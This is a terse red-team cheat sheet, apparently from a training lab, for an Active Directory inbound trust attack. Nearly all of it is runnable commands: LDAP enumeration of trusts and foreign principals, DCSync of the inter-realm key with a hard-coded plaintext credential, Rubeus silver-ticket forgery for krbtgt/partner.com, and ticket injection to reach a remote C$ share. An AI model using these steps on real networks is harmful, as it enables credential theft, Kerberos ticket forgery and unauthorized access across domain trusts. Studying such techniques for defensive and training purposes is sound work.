# Inbound Trust Attack

1.  \
    Enumerate the one-way trust.

    ```batch
    ldapsearch (objectClass=trustedDomain) --attributes trustDirection,trustPartner,trustAttributes,flatname
    ```
2.  Enumerate the Foreign Security Principals Container.

    ```batch
    ldapsearch (objectClass=foreignSecurityPrincipal) --attributes cn,memberOf --hostname partner.com --dn DC=partner,DC=com
    ```
3. Identify an interesting SID.
   1. `ldapsearch (objectSid=[SID])`
4. DCSync the shared inter-realm key.
   1. `make_token CONTOSO\dyork Passw0rd!`
   2. `dcsync contoso.com CONTOSO\PARTNER$`
   3. `rev2self`
5.  On the Attacker Desktop, forge a referral ticket.

    ```batch
    C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe silver /user:pchilds /domain:CONTOSO.COM /sid:S-1-5-21-3926355307-1661546229-813047887 /id:1105 /groups:513,1106,6102 /service:krbtgt/partner.com /rc4:[NTLM HASH] /nowrap
    ```
6.  Use the forged ticket to request service tickets for the trusting domain.

    ```batch
    execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgs /service:cifs/par-jmp-1.partner.com /dc:par-dc-1.partner.com /ticket:[TICKET] /nowrap
    ```
7.  Inject the service ticket into the current logon session.

    ```batch
    execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /ticket:[TICKET]
    ```
8. Verify the ticket was injected.
   1. `run klist`
9. Access the service in the trusting domain.
   1. `ls \\par-jmp-1.partner.com\c$`

\
